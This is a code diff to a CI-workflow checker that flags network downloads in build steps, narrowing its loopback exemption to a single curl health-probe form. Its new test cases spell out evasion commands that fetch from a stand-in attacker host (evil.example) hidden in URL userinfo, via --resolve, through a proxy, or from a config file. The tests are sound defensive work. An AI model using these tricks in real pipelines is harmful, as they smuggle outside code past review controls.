@@ -11674,9 +11674,13 @@ FETCH_WORDS = re.compile(
     r")(?![\w-])",
     re.IGNORECASE,
 )
-# A curl or wget whose every URL is a literal loopback address reaches only a server the
-# job itself started, so it downloads nothing from outside the runner.
-LOOPBACK_URL = re.compile(r"https?://(?:127\.0\.0\.1|localhost|\[::1\])(?:[:/]\S*)?$")
+# The one curl the check admits is a health probe of a server the job itself started: it
+# reads a loopback URL and discards the body, so nothing from outside the runner lands on
+# disk. The exemption is a closed form, not a list of refused options: the options must be
+# `-s`, `-f`, `-sf` or `-o /dev/null`, and the one URL a plain-http 127.0.0.1 address with
+# a port and a path (no userinfo, query, or other host spelling). wget is never exempt.
+PROBE_OPTIONS = frozenset({"-s", "-f", "-sf"})
+PROBE_URL = re.compile(r"http://127\.0\.0\.1:\d+/[A-Za-z0-9._/-]*")
 PIP_INSTALL = re.compile(r"(?<![\w.-])pip(?:3(?:\.\d+)?)?\s+(install|download|wheel)\b", re.I)
 PIP_REQUIREMENT = re.compile(r"(?<!\S)(?:-r|--requirement)(?:\s+|=)(\S+)")
 CARGO_INSTALL = re.compile(r"(?<![\w./-])cargo\s+(?:\+\S+\s+)?install\b")
@@ -11872,15 +11876,26 @@ def scanned_text(step: dict) -> str:
     return "\n".join(texts)
 
 
-def loopback_fetch(text: str, match: re.Match) -> bool:
-    """Whether a curl or wget command fetches only literal loopback URLs."""
-    if match.group(1).lower() not in ("curl", "wget"):
+def loopback_probe(text: str, match: re.Match) -> bool:
+    """Whether a curl command is exactly the closed health-probe form PROBE_URL admits."""
+    if match.group(1) != "curl":
         return False
     command = re.split(r"&&|\|\||[;|\n]", text[match.end() :], maxsplit=1)[0]
-    if "$" in command or "`" in command:
-        return False
-    urls = [t for t in command.split() if "://" in t]
-    return bool(urls) and all(LOOPBACK_URL.match(u.strip("\"'")) for u in urls)
+    tokens = command.split()
+    urls = 0
+    i = 0
+    while i < len(tokens):
+        token = tokens[i]
+        if token in PROBE_OPTIONS:
+            i += 1
+        elif token == "-o" and i + 1 < len(tokens) and tokens[i + 1] == "/dev/null":
+            i += 2
+        elif PROBE_URL.fullmatch(token):
+            urls += 1
+            i += 1
+        else:
+            return False
+    return urls == 1
 
 
 def run_gaps(label: str, step: dict, job: dict | None) -> list[str]:
@@ -11888,7 +11903,7 @@ def run_gaps(label: str, step: dict, job: dict | None) -> list[str]:
     gaps = []
     text = scanned_text(step)
     words = sorted({
-        m.group(1).lower() for m in FETCH_WORDS.finditer(text) if not loopback_fetch(text, m)
+        m.group(1).lower() for m in FETCH_WORDS.finditer(text) if not loopback_probe(text, m)
     })
     if words:
         gaps.append(
@@ -12701,6 +12716,23 @@ def check_verified_downloads(documents: list[tuple[Path, dict]]) -> None:
         ],
         "curl of a computed URL": [{"run": 'curl -sf "http://127.0.0.1:$PORT/a"'}],
         "curl with a URL-less config": [{"run": "curl -K /tmp/urls"}],
+        "loopback-looking curl whose userinfo hides an outside host": [
+            {"run": "curl -o a.zip http://localhost:80@evil.example/a.zip"}
+        ],
+        "127.0.0.1 curl whose userinfo hides an outside host": [
+            {"run": "curl -o a.zip http://127.0.0.1:1@evil.example/a.zip"}
+        ],
+        "loopback curl resolved to an outside address": [
+            {"run": "curl --resolve localhost:80:203.0.113.5 -o a.zip http://localhost/a.zip"}
+        ],
+        "loopback curl through an outside proxy": [
+            {"run": "curl -x evil.example:8080 -o a.zip http://localhost/a.zip"}
+        ],
+        "loopback curl with a config file": [{"run": "curl -K urls.txt http://127.0.0.1/"}],
+        "loopback curl that keeps the body": [
+            {"run": "curl -sf -o probe.out http://127.0.0.1:9090/scp-test"}
+        ],
+        "wget of a loopback probe URL": [{"run": "wget -q http://127.0.0.1:9090/scp-test"}],
         "loopback curl chained to an outside curl": [
             {"run": "curl -sf http://127.0.0.1:9090/a && curl -sf https://example.invalid/b"}
         ],
@@ -12793,6 +12825,9 @@ def check_verified_downloads(documents: list[tuple[Path, dict]]) -> None:
         "a loopback health probe": [
             {"run": "for _ in $(seq 60); do curl -sf -o /dev/null "
                     "http://127.0.0.1:9090/scp-test && break; sleep 1; done"}
+        ],
+        "a bare loopback health probe": [
+            {"run": "curl -sf -o /dev/null http://127.0.0.1:9090/scp-test"}
         ],
         "docker exec into a running container": [
             {"run": "docker exec scp-ci-postgres pg_isready -U postgres"}
